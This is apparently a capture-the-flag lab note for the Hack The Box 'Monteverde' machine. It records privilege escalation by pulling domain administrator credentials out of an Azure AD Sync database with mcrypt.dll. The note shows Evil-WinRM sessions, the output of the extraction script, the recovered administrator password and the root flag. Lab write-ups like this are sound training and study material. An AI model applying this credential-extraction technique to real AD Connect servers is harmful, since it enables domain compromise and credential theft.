
`Get-Service -Name "ADSync"`

```sh
*Evil-WinRM* PS C:\Users\mhope> Get-Service -Name "ADSync"

Status   Name               DisplayName
------   ----               -----------
Running  ADSync             Microsoft Azure AD Sync
```

try and extract credentials:
```powershell
Import-Module "C:\Program Files\Microsoft Azure AD Sync\Bin\ADSync\ADSync.psd1"
$adConnector = Get-ADSyncConnector | Where-Object {$_.Type -eq "AD"}
$aadConnector = Get-ADSyncConnector | Where-Object {$_.Type -eq "AzureActiveDirectory"}
$aadCreds = Get-ADSyncAADCredential -ConnectorId $aadConnector.Identifier
```
fail

articles mention mcrypt.dll

```sh
*Evil-WinRM* PS C:\program files\Microsoft Azure AD Sync\bin> ls mcrypt.dll


    Directory: C:\program files\Microsoft Azure AD Sync\bin


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/31/2018   4:54 PM         335744 mcrypt.dll
```


running the exploit script from  works:
```sh
*Evil-WinRM* PS C:\users\mhope\desktop> ./script2.ps1
Attempting connection: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True
Error connecting to SQL database. Trying next...
Exception Message: A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 52 - Unable to locate a Local Database Runtime installation. Verify that SQL Server Express is properly installed and that the Local Database Runtime feature is enabled.)
Attempting connection: Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True
Connection successful!
Loading mcrypt.dll from: C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

But I want to understand in detail, not just that the dll is used to decrypt data in the sql database [[../../../Tools n Info/10 - AD/getting azure creds|getting azure creds]]

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/montverde/mhope]
└─$ evil-winrm -i 10.129.228.111 -u 'administrator' -p 'd0m@in4dminyeah!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         8/3/2025   3:19 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
c05a03b05a128e0a2c09ce6b47693789
```
